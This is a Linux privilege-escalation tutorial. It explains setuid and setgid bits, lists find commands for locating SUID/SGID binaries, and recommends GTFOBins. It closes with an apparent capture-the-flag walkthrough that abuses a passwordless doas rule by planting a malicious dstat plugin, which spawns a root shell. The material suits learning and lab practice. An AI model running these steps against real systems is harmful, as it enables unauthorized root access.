### What are Special Permissions?

In Linux, **special permissions** like `setuid` and `setgid` allow a program to run with **someone else’s permissions**, usually a more powerful user like `root`. This can be **dangerous** if a program is insecure or misconfigured.

### 1. **What is setuid?**
- **setuid** = _Set User ID_
- If a file has the **setuid** bit set (`s` in place of `x`), it **runs as the file owner**, even if another user runs it.
- This is usually used to let **regular users run root-owned programs as root**.

🔎 Example command to find these:
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
This shows all files **owned by root** with **setuid** permissions.

📌 Example result:
```bash
-rwsr-xr-x 1 root root ... /usr/bin/passwd
```

The `s` in `rwsr-xr-x` means setuid is set. This program runs as `root` even when run by a normal user.

---

### 🧪 Why is setuid interesting for hacking?

If the program is **poorly written**, a hacker might trick it into doing something like **spawning a root shell**, giving **full control of the system**.---

---

### 👥 2. **What is setgid?**
- **setgid** = _Set Group ID_
- It works like setuid, but instead of running as the file's **owner**, it runs as the file's **group**.

🔎 Command to find these:
```bash
find / -uid 0 -perm -6000 -type f 2>/dev/null
```
📌 Example result:
```
`-rwsr-sr-x 1 root root ... /usr/lib/snapd/snap-confine`
```
The `s` in the **group section** means setgid is set.

___
# Exploiting SUID Binaries

```bash
# SUID
find / -type f -perm -u=s 2>/dev/null
find / -type f -perm -04000 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# SGID
find / -type f -perm -g=s 2>/dev/null
find / -type f -perm -02000 2>/dev/null
find / -user root -perm -2000 -exec ls -ldb {} \; 2>/dev/null
```

Once you find a suspicious binary with SUID, check it on https://gtfobins.github.io.

> GTFOBins provides ready-to-use commands to exploit known binaries for:
> 
> - File reads/writes
> - Spawning shells
> - Privilege escalation (SUID, sudo, etc.)

____



### SUID (doas)
find the doas config file

```bash
find / -name doas.conf 2>/dev/null
```

If we read this configuration file, we see that the user account player has the privileges to run `/usr/bin/dstat` as root without a password.

```bash
player@soccer:~$ cat /usr/local/etc/doas.conf 
permit nopass player as root cmd /usr/bin/dstat
```

Next, we need to check the location of `dstat` to create a malicious plugin. `dstat` supports custom plugins, and since we have permission to run this software as root via `doas` without needing a password, we can achieve privilege escalation through this malicious plugin to create a reverse shell or spawn a shell as `root`.

```bash
player@soccer:~$ find / -type d -name dstat 2>/dev/null
/usr/share/doc/dstat
/usr/share/dstat
/usr/local/share/dstat
```

This will drop into Bash for an interactive shell.

Looking at the list of locations, I can obviously write to `~/.dstat`, but when run with `doas`, it’ll be running as root, and therefore won’t check `/home/player/.dstat`. Luckily, `/usr/local/share/dstat` is writable.

```bash
echo -e 'import os\\n\\nos.system("/bin/bash")' > /usr/local/share/dstat/dstat_0xdf.py

```

With that in place, I’ll invoke `dstat` with the `0xdf` plugin:

```bash
player@soccer:~$ doas /usr/bin/dstat --0xdf
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
root@soccer:/home/player#
```